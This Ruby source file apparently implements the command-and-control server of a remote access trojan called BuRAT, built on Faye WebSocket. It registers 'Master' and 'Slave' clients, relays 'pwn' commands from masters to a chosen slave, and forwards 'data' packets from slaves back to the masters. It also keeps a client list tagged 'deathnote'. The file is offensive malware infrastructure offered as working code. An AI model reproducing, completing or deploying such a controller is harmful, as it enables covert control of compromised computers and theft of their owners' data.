require 'faye/websocket'
require 'json'

require_relative 'lib/client'
require_relative 'lib/inator'
require_relative 'lib/pipe'

module BuRAT
  class WebSocketServer
    KEEPALIVE_TIME = 15 # in seconds

    def initialize(app)
      @app     = app
      @clients = []
    end

    def call(env)
      if Faye::WebSocket.websocket?(env)
        ws = Faye::WebSocket.new(env, nil, {ping: KEEPALIVE_TIME })

        # OPEN
        ws.on :open do |event|

        end

        # MESSAGE
        ws.on :message do |event|
          begin
            packet = JSON.parse(event.data) # parse packet

            header = packet['header']       # header
            payload = packet['payload']     # payload
            trailer = packet['trailer']     # trailer

            p header
            #p trailer                       # debug

            if header == "client_list" then               # list of client
              packet = packet('client_list', @clients, 'deathnote')
              ws.send(packet)
            elsif header == "client_identification" then  # identification
              client = @clients.find { |client| client["id"] == payload['id'] }
              payload.store("status", "Online")
              payload.store("ws", ws)
              client == nil ? @clients << payload : client.replace(payload)
              packet = packet('client_status', payload, "disconnected")
              master('*', packet)
            elsif header == "data" then                   # data
              data(payload, trailer)                      # payload = data from slave to master
            elsif header == "pwn" then                    # pwn
              pwn(payload, trailer)                       # payload = pwn from master to slave
            elsif header == "pipe" then                   # pipe
              pipe(payload)                               # soon...
            elsif header == 'config' then                 # config
              config(payload)                             # soon...
            end
          rescue
            #ws.send(event.data)
            #some server stuff here if error is packet is not json
          end
        end

        # CLOSE
        ws.on :close do |event|
          client = @clients.find { |client| client["ws"] == ws }
          client["status"] = "Offline"
          client["ws"] = nil
          packet = packet('client_status', client, "disconnected")
          master('*', packet)
        end

        # Return async Rack response
        ws.rack_response

      else
        @app.call(env)
      end
    end

    private
    def master(id, packet)
      if id == "*" then
        clients = @clients.select { |client| client["type"] == "Master" && client["status"] == "Online" }
        clients.each { |client| client["ws"].send(packet) }
      else
        client = @clients.find { |client| client["id"] == id && client["status"] == "Online" }
        client["ws"].send(packet)
      end
    end

    def slave(id, packet)
      if id == "*" then
        clients = @clients.select { |client| client["type"] == "Slave" && client["status"] == "Online" }
        clients.each { |client| client["ws"].send(packet) }
      else
        client = @clients.find { |client| client["id"] == id && client["status"] == "Online" }
        client["ws"].send(packet)
      end
    end

    # DATA
    # {'header': 'data', 'payload': {'client.id': '', 'inator.id': '', 'data': ''}, 'trailer': ''}
    def data(payload, trailer)
      packet = packet('data', payload, trailer)
      master('*', packet)
      # pipe data
    end

    # PWN
    # {'header': 'pwn', 'payload': {'client.id': '', 'inator.id': '', 'data': ''}, 'trailer': ''}
    def pwn(payload, trailer)
      packet = packet('pwn', payload, trailer)
      slave(payload['client.id'], packet)
    end

    #pipe
    def pipe(payload)
      p payload
    end

    #config
    def config(payload)
      p payload
    end

    #packet
    def packet(header, payload, trailer)
      packet = {'header' => header, 'payload' => payload, 'trailer' => trailer}.to_json
    end

  end
end
